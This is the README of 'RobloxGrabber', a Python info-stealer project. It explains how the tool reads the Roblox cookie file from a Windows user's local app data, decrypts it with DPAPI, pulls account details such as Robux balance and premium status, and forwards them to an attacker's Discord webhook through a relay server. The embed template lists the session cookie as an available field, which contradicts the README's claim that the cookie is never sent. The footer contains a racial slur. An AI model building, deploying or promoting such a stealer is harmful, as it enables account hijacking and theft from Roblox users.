<div align="center">

# 🔓 RobloxGrabber

**Decrypt Roblox cookies, pull account stats, and forward everything to a Discord webhook.**

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)

</div>

---

## 📁 Structure

```
RobloxGrabber/
├── grab.py        # cookie decryptor + info from cookie + sends to server
├── server.py      # fastapi server with rate limiting so webhook isnt spammed
├── embed.py       # discord embed layout - edit if wanted
├── config.json    # webhook url goes here
└── README.md
```

## ⚙️ Setup

**1. Install dependencies**

```bash
pip install fastapi uvicorn requests
```

**2. Add your webhook**

Paste your Discord webhook URL in `config.json`:

```json
{
    "webhook_url": "https://discord.com/api/webhooks/..."
}
```

**3. Run the server**

```bash
python server.py
```

Starts on `0.0.0.0:8080` with hot reload.

**4. Run the grabber**

```bash
python grab.py
```

## 🔧 How It Works

1. Reads `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat`
2. Reads `CookiesData` field (base64 encoded DPAPI blob)
3. Decode base64 → DPAPI decrypts using current Windows user credentials
4. Reads the decrypted cookie
5. Gets info from Roblox API:
   - Username / Display Name / User ID
   - Robux balance
   - Friends & Followers count
   - Premium status
   - Avatar headshot
6. Will send a request to /api/send_wh_msg 

> Cookie is **never** sent to the server

## 🎨 Customizing the Embed

Edit `embed.py` to change how the Discord embed looks:

```python
color = 0xED4245          # embed color (red)
use_avatar = True         # show user avatar as thumbnail
title = "{username}"      # embed title

infos = (                 # embed description template
    "`👤`  **User:** `{username}`\n"
    "`💰`  **Robux:** `R${robux}`\n"
    ...
)
```

Available data: `{username}`, `{display_name}`, `{user_id}`, `{robux}`, `{friends}`, `{followers}`, `{premium_tag}`, `{cookie}`

## 🚦 Rate Limiting

Server makes sure that there is only **2 requests per IP every 10 minutes**. Returns `403` after that.

---

<div align="center">

**iosxvv** · [nigger.works](https://nigger.works) · [github.com/iosviolador](https://github.com/iosviolador)

</div>
